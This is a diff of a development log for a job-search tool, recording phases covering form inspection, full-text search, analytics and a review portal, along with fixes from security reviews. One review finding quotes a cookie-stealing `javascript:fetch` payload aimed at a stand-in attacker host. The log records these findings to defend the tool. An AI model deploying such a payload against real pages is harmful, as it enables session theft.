@@ -15,9 +15,9 @@ Phases are defined in `architecture.md` §33. Build one at a time. Do not skip a
 | 3b | Requirement extraction, reasoning provider, evaluation, cache, spend accounting, `evaluate` + `recommend` | done |
 | 3.5 | Notifier (terminal, desktop, webhook), daily digest, `digest` | done |
 | 4 | Fact store, `.docx`/`.pdf` import as draft facts, **archetype** resumes, claim validation, resume diff, `.docx` output | done |
-| 5 | Application tracking, state history, notes, recommendation overrides, application question bank | in progress |
-| 6 | SQL search, FTS5, funnel + segment analytics, `stats` | not started |
-| 6.5 | Review portal: queue, application timeline, analytics | not started |
+| 5 | Application tracking, state history, notes, recommendation overrides, application question bank, form inspection | done |
+| 6 | SQL search, FTS5, funnel + segment analytics, `stats`, `search`, `ask` | done |
+| 6.5 | Review portal: queue, application timeline, analytics | done |
 | 7 | Career memory / local RAG | speculative |
 | 8 | Learning loop | speculative |
 | 9 | Desktop application shell (Tauri over the portal, CLI as sidecar) | planned (see `docs/vision.md`) |
@@ -104,6 +104,303 @@ Phases are defined in `architecture.md` §33. Build one at a time. Do not skip a
 | 2026-08-14 | `applications` is rebuilt in migration 007, the third table created before its phase was designed. | It carried a free-text `notes` column duplicating the `notes` table and no way to record which resume was actually sent. A reply six weeks later is only informative if the document that earned it can still be named. |
 | 2026-08-14 | Passing on a recommended role is recorded as deliberately as applying to one. | Both directions are feedback, and the half that gets discarded everywhere else — "it recommended this and I ignored it" — is the half that says the scoring is wrong. Phase 8 can only learn from what phase 5 collects. |
 | 2026-08-14 | Status history orders by insertion within the same instant. | Recording an application and correcting its status in the same millisecond is ordinary, and the tie-break was a random id, so the history displayed in random order. Found by a test that ran the transitions faster than the clock ticks. |
+| 2026-08-14 | Form inspection reads Greenhouse and reports that it cannot read Lever or Ashby, rather than rendering their apply pages to guess. | Verified against all three live APIs: Greenhouse publishes the question set (`?questions=true`), the other two publish the posting and not the form. Guessing an employer's questions from rendered markup produces a confident wrong record, which the career-page adapter already refuses to do for postings. |
+| 2026-08-14 | Voluntary self-identification questions are reported, never matched against the bank and never stored. | EEO questionnaires are asked per application by design — Instacart's own form says so — and they are the exact categories the product promises never to infer. Two live payload shapes carry them: `compliance[].questions` with `fields`, and `demographic_questions` with `answer_options`. |
+| 2026-08-14 | `isSensitiveQuestion` now matches "authorized to work" and "eligible to work", not only "work authorization". | The commonest US phrasing reverses the word order, so "Are you legally authorized to work in the United States?" was reported as an ordinary question on a real Discord form and would have been answerable from the bank. Found by running the new command against a live posting, not by reading the regex. |
+| 2026-08-14 | Sensitivity patterns are anchored on word boundaries, and identity for a protected question is its whole text. | A cross-model review ran the substring patterns: `age` matched "manage", `race` matched "embrace", `disab` matched "disable". It then showed that the lossy answer key could be collided deliberately, so an employer's ordinary question could be shown the user's answer to a protected one. The key still unifies phrasings; it is no longer trusted alone. |
+| 2026-08-14 | A Greenhouse board and job id must come from the same URL. | Deriving them separately let a configured board be paired with a number taken from an attacker-influenced posting URL, returning another role's questions under this role's name. A configured board that disagrees with the URL is now reported, not reconciled. |
+| 2026-08-14 | The search index is derived from the records, with a hash per document, and is never written to directly (migration 008). | An index that is also a place things are stored eventually disagrees with the database. Because it is derived, `--reindex` is always safe and an incremental sync costs six set-based statements regardless of corpus size. |
+| 2026-08-14 | FTS5 is external-content, and every user term is quoted as a literal phrase. | External content avoids a second copy of every description. Literal quoting is what stops `senior "staff" engineer (remote)` from being read as query syntax: a search box that can raise a syntax error is one people stop using. |
+| 2026-08-14 | Funnel stages past `applied` are read from the status events, not from the current status. | An application that reached a final round and was then rejected still had a final round. Reading the cached status would report a pipeline in which nobody was ever interviewed. |
+| 2026-08-14 | A rate with no denominator is reported as unknown, not as zero. | "0% of applications got a screen" is a claim about a job search. "No applications yet" is a fact about a database. |
+| 2026-08-14 | `ask` is deterministic, refuses semantic questions, and prints the command that reproduces every answer. | A question with an exact answer in a table should not be paraphrased by a model that may get the date wrong (§21). Resemblance questions need embeddings; answering them from keyword overlap would be confident and wrong. |
+| 2026-08-14 | The planner matches companies against the companies that exist, and a constraint consumes its own words. | Guessing an employer from capitalisation reads "Staff Engineer" as one. And "When did I apply to Ramp?" filtered on the company *and* demanded the word appear in the body — FTS requires every term — so a question with a good structured answer returned nothing. Both found by running it. |
+| 2026-08-14 | Every derived document detects change by content, not by identity. | A cross-model review pointed out that evaluations and notes were keyed on their id alone. Nothing edits them today, so nothing was stale — but an index whose correctness rests on nobody adding an edit path later is one that goes stale quietly. Jobs still compare their stored `description_hash`, because re-hashing 100 KB bodies to ask "did anything change?" makes the cheap question expensive. |
+| 2026-08-14 | The funnel window is applied *inside* the latest-verdict subquery. | Taking the latest verdict overall and then filtering by date meant a role recommended in July and re-evaluated in September reported July as recommending nothing. A later opinion must not rewrite an earlier month. |
+| 2026-08-14 | The correlated "latest verdict per role" join stays, because it was measured. | The review predicted it would degrade badly. `scripts/measure-search.ts` at 10,000 jobs: index build 512 ms, incremental sync 82 ms, keyword search 15 ms, that join 4 ms, funnel 3 ms. It is an index seek per row, not a scan. |
+| 2026-08-14 | The portal's decision button reads "Record that I applied", not "Apply". | It records an application and opens the posting in a new tab; it has no way to submit a form. A button labelled "Apply" in a tool that cannot apply is the one place this product could most easily mislead somebody about what it just did for them. |
+| 2026-08-14 | The review queue keeps a decided role visible with its decision, rather than removing it. | A queue that empties as you act on it cannot be checked afterwards. It is a record, not an inbox. |
+| 2026-08-14 | A posting's title reaches the portal verbatim, including markup, and is placed with `textContent`. | Rewriting a title would misquote the employer. The safety property is not that markup is absent — it is that markup can only ever be displayed. A test asserts the review script contains no `innerHTML`, `outerHTML`, `insertAdjacentHTML` or `document.write`. |
+| 2026-08-14 | Only canonicalised `https` links leave the portal, `/api/decide` takes no URL from the request, and the page refuses to open any other scheme. | A cross-model review found that `source_url` is stored raw when canonicalisation fails, so `javascript:` in a posting reached the queue as the link and was passed to `open()` when the user recorded that they had applied. Three layers, because a click-to-execute sink deserves more than one. |
+| 2026-08-14 | The search index is refreshed when `roleeye ui` starts, never by a route. | `GET /api/history` was calling the default `search()`, which syncs — a write transaction over the whole corpus, from a GET, repeatable in a loop. |
+| 2026-08-14 | `listRecommendations` breaks a timestamp tie by insertion order. | `MAX(created_at)` returns both rows when two evaluations of one role land in the same millisecond, so the review queue showed the role twice with contradictory advice. The same defect had already been fixed once, in status history. |
+| 2026-08-15 | Portal requests report a reason instead of throwing, and every progress word must resolve into something. | Reported on the first real run: "Saving..." stayed on screen forever because `fetch` rejected when the portal had been stopped. The rule is now explicit — a page that says it is doing something must always say how it ended, including when the thing it is talking to has gone away. |
+| 2026-08-15 | A 403 from the portal is explained as a stale token, not reported as a refusal. | Restarting `roleeye ui` mints a new token, so the commonest real failure is an old tab. "403" tells the user nothing they can act on; "open the link roleeye ui printed most recently" does. |
+| 2026-08-15 | `npm run ui`, and the help output names the first three commands to run. | `npm run dev` passes no command through, so it printed twenty commands and no starting point — which is what the first user of this repo actually hit. |
+| 2026-08-15 | A time window is `[since, until)` — inclusive start, exclusive end — in analytics and in search. | The automated PR review caught the mismatch: the planner builds a month as "the 1st to the 1st of the next month", and both query layers compared `<= until`. An application made at exactly midnight on 1 August was therefore counted in July *and* August, and two adjacent reports that each claim the same application cannot both be right. |
+| 2026-08-15 | The portal only opens `https` links, matching what the server can emit rather than what it merely permits. | The same review pointed out that canonicalisation upgrades every link the server keeps, so accepting `http` at the sink only widened it if the server's behaviour ever changed — the opposite of what a second layer is for. |
+
+## Phase 6.5 notes
+
+The portal stops being a setup wizard. Four views now: Setup, Review,
+Applications, Reports.
+
+### "Saving..." forever
+
+Reported by the user on the first real run, and the most instructive bug of the
+phase because none of it was new code.
+
+`api()` did not catch a rejected `fetch`. Every action that had written a
+progress word into the page — "Saving...", "Checking that board...", "Looking
+for a local model..." — left that word there permanently if the request never
+completed, and said nothing else. The trigger is ordinary: the portal was
+stopped while the tab stayed open.
+
+Three things were wrong, and the third is the one that matters:
+
+1. `api()` propagated the rejection, so every caller died mid-action.
+2. Callers assumed success anyway — `payload.sources.enabled` on a `{}` payload
+   throws, and `payload.items || []` renders "Nothing evaluated yet", which is
+   a lie about an unreachable server rather than an empty database.
+3. A restarted portal mints a new token, so the *likeliest* real failure is a
+   403 on an old tab — and "403" is not something a person can act on.
+
+`api()` now returns a stated reason instead of throwing, distinguishing an
+unreachable server, a stale token, and a timeout; every caller renders it. There
+is a 15-second timeout because a stopped server usually refuses instantly, but a
+browser holding a keep-alive socket to a process that has gone away waits for
+the TCP timeout instead — measured at several seconds of silence before the fix
+reported anything. A last-resort `unhandledrejection` handler writes to the
+alert bar, so no future action can freeze quietly.
+
+Two tests now hold this: the harness stops the portal and presses Save, and it
+runs the page with a token from an "earlier run". The harness had to stop
+forcing the correct token into every request first — it was supplying the right
+credential regardless of what the page held, which is precisely the thing that
+needed testing.
+
+**Two process lessons.** The cross-model reviews were scoped to the diff of each
+phase, so a latent defect in a file that phase did not touch was never in front
+of them. And the browser check was "does the new view render", not "what happens
+when this fails" — the failure paths were never exercised against a real server
+at all.
+
+### Nothing new is decided in the web layer
+
+Every route calls the function the CLI calls — `recordApplication`, `skipRole`,
+`addNote`, `setStatus`, `funnel`, `segments`, `search`. If the portal and the
+terminal could disagree about what applying to a role means, one of them would
+be lying and it would not be obvious which.
+
+That constraint is what made this phase small: three files, no new tables, no
+new domain logic. The work was in the views, not underneath them.
+
+### Apply records; it cannot apply
+
+The button says "Record that I applied", records the application, and opens the
+employer's page in a new tab. It has no way to submit anything, and the copy
+beside it says so. A button labelled "Apply" in a tool that cannot apply is the
+one place this product could most easily mislead somebody about what it just
+did on their behalf.
+
+The queue keeps a decided role visible with its decision beside it rather than
+removing it. A queue that empties as you act on it cannot be checked afterwards.
+
+### Two layers against hostile text, because one is a promise
+
+Job postings are written by strangers. The server bounds every string and
+flattens it to one line — that is what stops a terminal escape or a newline from
+rewriting the layout — and the page builds every node through `textContent`.
+
+A *title* is passed through verbatim, angle brackets and all, because rewriting
+it would misquote the employer. The safety property is not that markup is
+removed; it is that markup can only ever be displayed. A test asserts the review
+script contains no `innerHTML`, `outerHTML`, `insertAdjacentHTML` or
+`document.write`, and the page's CSP already forbids everything else.
+
+### What opening the page found
+
+The script is a string inside a `.ts` file, so it is executed against a DOM shim
+in tests, as the configuration page already was. That caught nothing this time.
+Opening the real page in a real browser caught the thing the shim cannot see: a
+CSS collision. `.co` was already the catalog's full-width company card, so every
+review card rendered the employer's name inside a bordered box on its own line.
+Renamed to `.byline`.
+
+The other find was a test that had been quietly protecting the right rule:
+`portal.test.ts` asserts free text exists only where free text belongs. The
+history search box tripped it. The assertion was updated with the reason —
+searching is not configuration, nothing typed into it is saved, and there is no
+set of options to pick from — rather than deleted.
+
+### What a cross-model review found
+
+The worst of it was a URL. `canonicalizeUrl` accepts only `http:` and `https:`,
+but a posting's `source_url` is stored raw when canonicalisation fails — so a
+posting advertising `javascript:fetch('http://attacker/'+document.cookie)`
+reached the queue, was displayed as the link, was saved as the place the user
+applied, and was handed to `open()` the moment they pressed *Record that I
+applied*. `noopener` is irrelevant to that: it is not a window-reference
+problem, it is a scheme problem.
+
+Three changes, because one was not enough for a sink this bad: the server emits
+only canonicalised `https` links, `/api/decide` no longer accepts a URL from the
+request at all (`recordApplication` derives it from the posting), and the page
+refuses to open anything that is not `http`/`https`. The DOM harness now presses
+the button on a role whose only link is script, with a spy on `open`.
+
+The rest:
+
+| Finding | What it allowed |
+|---|---|
+| `GET /api/history` refreshed the search index | A read ran a write transaction over the whole corpus — from a GET, unthrottled, in a loop if a page wanted one. `roleeye ui` syncs once at startup; the route is read-only. |
+| `listRecommendations` picked the latest verdict with `MAX(created_at)` | Two evaluations of one role saved in the same millisecond both satisfy the maximum, so the queue showed one role twice with contradictory advice. It orders by insertion within the instant now, exactly as status history already had to. |
+| `/api/pipeline` and `/api/job` had unbounded fan-out | Every application, with every status event and every note, built into one response by the single process everything else runs in. All three are bounded and the page can ask for a page size, capped. |
+| `since` was passed to the report window unvalidated | `?since=whenever` silently produced a report over a window nobody asked for. It is a 400 now. |
+| `POST /api/note` had no way to be called | The route existed and no button reached it. Notes are the thing a scraper cannot know — who the recruiter was, what the salary conversation actually said — so the detail panel now has the field. |
+
+## Phase 6 notes
+
+Search, analytics, and `ask` — three commands over data that already existed.
+
+### The index is derived, and that is the design
+
+`search_documents` holds logical documents (§19): a posting, a verdict, a note,
+an answer, an outcome. Every one is built from a record and carries the hash of
+what it was built from, so a rebuild is incremental and dropping the whole index
+is always safe. An index that is *also* a place things are stored eventually
+disagrees with the database, and the database is the source of truth.
+
+FTS5 is external-content, so descriptions are stored once rather than twice — a
+few thousand postings at up to 100 KB each is not something to keep two copies
+of for the sake of a simpler trigger.
+
+Sync is set-based SQL: five `INSERT … SELECT … WHERE NOT EXISTS` statements and
+one delete. A hundred postings and ten thousand cost the same six statements.
+The alternative — read everything, hash it in TypeScript, write it back — is how
+a two-second command becomes a two-minute one exactly when the corpus gets big
+enough to be worth searching.
+
+### User words are words, not query syntax
+
+FTS5's `MATCH` is a language: `AND`, `NEAR`, `*`, `"`, `:` and `^` all mean
+something, and a stray quote is a syntax error. Someone typing
+`senior "staff" engineer (remote)` means those words. Every term is quoted as a
+literal and the operators are unreachable from input, because a search box that
+can raise a syntax error is a search box people stop using.
+
+### The funnel is computed, never remembered
+
+Nothing in migration 008 stores a metric. The funnel is a query over `jobs`,
+`job_screenings`, `evaluations`, `applications` and `application_status_events`,
+which is why those tables record history rather than a current state.
+
+The stages past `applied` read the *events*, not the current status: an
+application that reached a final round and was then rejected had a final round.
+Counting where things ended up would report a pipeline in which nobody was ever
+interviewed.
+
+A rate with no denominator is `undefined`, not `0%`. "0% of applications got a
+screen" is a claim about a job search; "no applications yet" is a fact about a
+database.
+
+### `ask` shows its work, and refuses what it cannot do
+
+The planner is deterministic and makes no model call. That is not a limitation
+of the phase: "When did I apply to Zeta?" has one right answer sitting in a
+table, and sending it to a model adds latency, cost and the possibility of a
+wrong date. §21 says it directly — never produce an exact date or status from
+memory when a record exists.
+
+Every answer names the plan, why it was chosen, and the `roleeye search` or
+`roleeye stats` command that reproduces it. An answering interface that cannot
+be checked is one you have to trust.
+
+SEMANTIC questions — "which roles felt similar to that one?" — are recognised
+and refused, naming embeddings and Phase 7. Answering them from keyword overlap
+would produce a confident, plausible, wrong list.
+
+Two things live testing changed. A company is matched only against companies
+that exist in the database, because guessing from capitalisation reads "Staff
+Engineer" as an employer. And a constraint consumes its own words: "When did I
+apply to Ramp?" filters on the company, and leaving `ramp` in the text query
+also demanded the word appear in the body — FTS requires every term, so the
+question that had a perfectly good structured answer returned nothing.
+
+### What a cross-model review found
+
+| Finding | What it allowed |
+|---|---|
+| `group_concat` over no rows returns NULL, and `body` is `NOT NULL` | An application with no status events would have aborted the *entire* sync, not just its own document. |
+| The funnel took the latest verdict and *then* applied the window | A role recommended in July and re-evaluated in September reported July as having recommended nothing. A later opinion was rewriting an earlier month. |
+| Evaluations and notes were keyed on their id alone | They are append-only today, so nothing was stale. But an index whose correctness rests on nobody adding an edit path later is one that expires quietly. Both now hash the content they were built from and update when it changes. |
+| `\s` does not match ESC | Excerpts collapse whitespace before printing, which does nothing to `\x1b[1A`. A posting could move the cursor up and overwrite the result printed above its own. |
+| The company match was a substring test | "How many roles skip the ramp-up period?" silently restricted the whole question to Ramp. It matches on word boundaries now. |
+| `skip` meant the user skipped | "Which roles skip the technical screen?" was read as `applied: false` and returned nothing, explaining nothing. |
+
+The seventh finding — that the correlated "latest verdict per role" subquery
+would degrade badly — was measured rather than argued about
+(`scripts/measure-search.ts`). At 10,000 jobs and 13,000 documents: a full index
+build 512 ms, an incremental sync over an unchanged corpus 82 ms, a keyword
+search 15 ms, the structured search carrying that join **4 ms**, and the funnel
+3 ms. It is an index seek per row against `idx_evaluations_job`, not a scan, so
+it stays.
+
+## Phase 5 notes
+
+Application tracking, status history, notes, overrides and the question bank
+shipped on 2026-08-14 (`roleeye apply record|status|note|skip|list|show`). What
+follows is the last item of the phase, added afterwards.
+
+### Form inspection
+
+`roleeye apply questions <job-id>` answers one question: *what does this
+application ask that my resume does not already say?*
+
+The value is the residue. Name, email, phone and the resume upload are already
+answered by the documents Phase 4 produces; the thing that costs an evening is
+the twelve boxes underneath them, which are largely the same twelve boxes as the
+last employer's. So the report splits them and matches only the residue against
+the bank.
+
+Coverage is narrow because reality is:
+
+| Provider | Publishes its form? |
+|---|---|
+| Greenhouse | yes — `?questions=true` on the board API |
+| Lever | no |
+| Ashby | no |
+
+All three were checked live. The alternative — rendering an apply page in a
+browser and reading its inputs — would produce a confident guess about what an
+employer asks, and the career-page adapter already refuses to do exactly that
+for postings. An unsupported provider says so and names the URL to open.
+
+Three things the form itself is not allowed to do: reach the answer bank with a
+self-identification question, survive as markup into a label, or supply a
+protected answer by resembling one. The first is a policy (EEO questions are
+per-application and are never stored), the second is §40 applied to a new
+boundary, and the third is `AnswerRepository.lookup` doing what it already did.
+
+`--save` writes each unanswered question into the bank with no answer — the
+honest state: the form asked, nothing has been said yet. Answer it once with
+`roleeye apply answer`, and the next employer asking the same thing shows it
+back.
+
+### What a cross-model review found
+
+A second model attacked the diff before it merged. Six findings were real, and
+four of them were about the same thing: the answer bank's key is *deliberately
+lossy* — that is how two phrasings of one question share a row — and lossy keys
+had become the only thing standing between a protected question and somebody
+else's answer.
+
+| Finding | What it allowed |
+|---|---|
+| Key collisions crossed the sensitivity boundary | An employer writing a question that shares a key with a protected one was shown the user's answer to the other question. A protected question now requires the *whole* question to match, and sensitivity must agree in both directions. |
+| Labels were truncated to 200 characters before the sensitivity check | "…do you require visa sponsorship?" placed past the cut read as an ordinary question. Labels are now bounded for storage, not for display; the CLI truncates when it prints. |
+| Demographics were classified by provider field name only | A voluntary "What is your sexual orientation?" added as an ordinary custom question arrives as `question_14826587008`, which matches nothing — so it was looked up in the bank and stored. Classification now reads the question too. |
+| Board and job id were derived independently | A posting URL is attacker-influenced, so a configured board could be paired with a number scraped off another URL, returning a different role's questions under this role's name. Both halves now come from one URL, and a disagreement is refused rather than resolved. |
+| `{}` was reported as "this form asks nothing" | A provider changing its response shape would have produced the most misleading output available. A payload with no question list is now unreadable, not empty. |
+| `--json` returned 0 where the text output returned 5 | Automation saw success for a run that printed "0 of 14 ready to reuse". One outcome is computed once, for both modes. |
+
+Two of the regex findings were checked by running them rather than reading
+them. The substring patterns matched `manage` (via `age`), `embrace` (via
+`race`), `disable`, `traced` and "object orientation" — five ordinary
+engineering questions refused as protected, which is how a user learns to
+ignore the protection. They are anchored on word boundaries now, and the same
+pass added the phrasings that were missing: work permit, employment
+authorization, hourly rate, wage, OTE, national origin, ancestry.
 
 ## Phase 4 notes
 
